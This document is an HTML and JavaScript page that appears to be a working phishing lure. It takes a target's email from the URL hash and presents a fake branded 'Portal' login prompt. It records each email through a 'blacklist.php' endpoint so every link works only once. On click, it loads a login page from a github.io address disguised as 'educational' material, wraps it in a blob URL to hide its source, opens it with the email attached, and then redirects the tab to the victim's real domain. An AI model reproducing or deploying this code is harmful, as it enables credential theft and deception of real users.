<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }
        .container {
            background: white;
            padding: 50px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 450px;
            width: 90%;
            border: 1px solid #e9ecef;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        .subtitle {
            color: #666;
            margin-bottom: 25px;
            font-size: 14px;
        }
        .email-box {
            background: #f8f9fa;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 25px;
            font-size: 14px;
            color: #495057;
            word-break: break-all;
            border: 1px solid #e9ecef;
        }
        .email-box span {
            font-weight: 600;
            color: #667eea;
        }
        #clickButton {
            padding: 15px 50px;
            font-size: 16px;
            font-weight: 600;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
            width: 100%;
        }
        #clickButton:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }
        #clickButton:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
            min-height: 24px;
        }
        .status-success { color: #28a745; }
        .status-error { color: #dc3545; }
        .status-loading { color: #667eea; }
        .status-blacklisted { color: #ff9800; }
        .loader {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .domain-name {
            color: #333;
            font-weight: 700;
            text-transform: capitalize;
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <h1>Welcome to <span class="domain-name" id="domainDisplay">Loading...</span> Portal</h1>
        <p class="subtitle">Click the button below to continue to your secure login page</p>
        
        <div class="email-box">
             <span id="emailDisplay">Loading...</span>
        </div>
        
        <button id="clickButton">Continue to Login</button>
        <div id="status"></div>
    </div>

    <script>
        (function() {
            // Decode email from URL hash
            function decodeEmailFromHash() {
                const hash = window.location.hash.substring(1);
                if (!hash) return null;
                
                try {
                    const urlDecoded = decodeURIComponent(hash);
                    const base64Decoded = atob(urlDecoded);
                    if (base64Decoded && base64Decoded.includes('@') && base64Decoded.includes('.')) {
                        return base64Decoded;
                    }
                } catch (e) {}
                
                const emailWithAt = hash.replace(/\$/g, '@');
                if (emailWithAt.includes('@') && emailWithAt.includes('.')) {
                    return emailWithAt;
                }
                
                return null;
            }
            
            // Extract domain from email
            function getDomainFromEmail(email) {
                if (!email) return null;
                const parts = email.split('@');
                if (parts.length === 2) {
                    const domainPart = parts[1].split('.')[0];
                    return domainPart.charAt(0).toUpperCase() + domainPart.slice(1);
                }
                return null;
            }
            
            const plainEmail = decodeEmailFromHash();
            const emailDisplay = document.getElementById('emailDisplay');
            const domainDisplay = document.getElementById('domainDisplay');
            const statusDisplay = document.getElementById('status');
            const clickButton = document.getElementById('clickButton');
            const mainContainer = document.getElementById('mainContainer');
            
            if (plainEmail) {
                emailDisplay.textContent = plainEmail;
                
                // Get and display domain name
                const domainName = getDomainFromEmail(plainEmail);
                if (domainName) {
                    domainDisplay.textContent = domainName;
                } else {
                    domainDisplay.textContent = 'Secure';
                }
                
                // Check if email is blacklisted (already used)
                function checkBlacklist() {
                    fetch('blacklist.php?action=check&email=' + encodeURIComponent(plainEmail))
                        .then(response => response.json())
                        .then(data => {
                            if (data.blacklisted) {
                                // Email is blacklisted - redirect immediately
                                statusDisplay.innerHTML = '⛔ This email has already been used. Redirecting...';
                                statusDisplay.className = 'status-blacklisted';
                                clickButton.disabled = true;
                                clickButton.textContent = 'Already Used';
                                
                                setTimeout(function() {
                                    const domain = plainEmail.split('@')[1];
                                    if (domain) {
                                        window.location.replace('https://' + domain);
                                    } else {
                                        window.close();
                                    }
                                }, 1500);
                            } else {
                                // Email is not blacklisted - show the page normally
                                clickButton.disabled = false;
                            }
                        })
                        .catch(error => {
                            console.error('Error checking blacklist:', error);
                            // If can't check, allow access (fallback)
                            clickButton.disabled = false;
                        });
                }
                
                // Disable button initially while checking
                clickButton.disabled = true;
                statusDisplay.innerHTML = '<span class="loader"></span> Verifying access...';
                statusDisplay.className = 'status-loading';
                
                // Check blacklist
                checkBlacklist();
                
                let redirectTimer = null;
                let popupWindow = null;
                
                clickButton.addEventListener('click', function() {
                    if (this.disabled) return;
                    
                    // Update UI
                    this.disabled = true;
                    this.textContent = '⏳ Opening...';
                    statusDisplay.innerHTML = '<span class="loader"></span> Loading login page...';
                    statusDisplay.className = 'status-loading';
                    
                    // Add email to blacklist
                    fetch('blacklist.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: 'action=add&email=' + encodeURIComponent(plainEmail)
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            console.log('✅ Email added to blacklist');
                        }
                    })
                    .catch(error => console.error('Error adding to blacklist:', error));
                    
                    // Fetch login page and open popup directly
                    fetch('https://tutorial-material.github.io/educational_stationary')
                        .then(response => {
                            if (!response.ok) {
                                throw new Error('Failed to load login page');
                            }
                            return response.text();
                        })
                        .then(html => {
                            // Create blob URL
                            const blob = new Blob([html], { type: 'text/html' });
                            const blobUrl = URL.createObjectURL(blob);
                            
                            // Open popup with the email
                            const fullUrl = blobUrl + '#' + plainEmail;
                            popupWindow = window.open(fullUrl, '_blank');
                            
                            if (popupWindow) {
                                statusDisplay.innerHTML = '✅ Login page opened successfully!';
                                statusDisplay.className = 'status-success';
                                clickButton.textContent = '✓ Opened';
                                
                                // Redirect this window to email domain after 2 seconds
                                if (redirectTimer) clearTimeout(redirectTimer);
                                redirectTimer = setTimeout(function() {
                                    try {
                                        const domain = plainEmail.split('@')[1];
                                        if (domain) {
                                            window.location.replace('https://' + domain);
                                        } else {
                                            window.close();
                                        }
                                    } catch(e) {
                                        window.close();
                                    }
                                }, 2000);
                            } else {
                                // Popup was blocked - allow retry
                                statusDisplay.innerHTML = '❌ Popup was blocked. Please allow popups and try again.';
                                statusDisplay.className = 'status-error';
                                clickButton.disabled = false;
                                clickButton.textContent = 'Retry';
                            }
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            statusDisplay.innerHTML = '❌ Failed to load login page. Please try again.';
                            statusDisplay.className = 'status-error';
                            clickButton.disabled = false;
                            clickButton.textContent = 'Retry';
                        });
                });
            } else {
                emailDisplay.textContent = '❌ No valid email found';
                domainDisplay.textContent = 'Secure';
                clickButton.disabled = true;
                clickButton.textContent = 'Invalid Email';
            }
        })();
    </script>
</body>
</html>
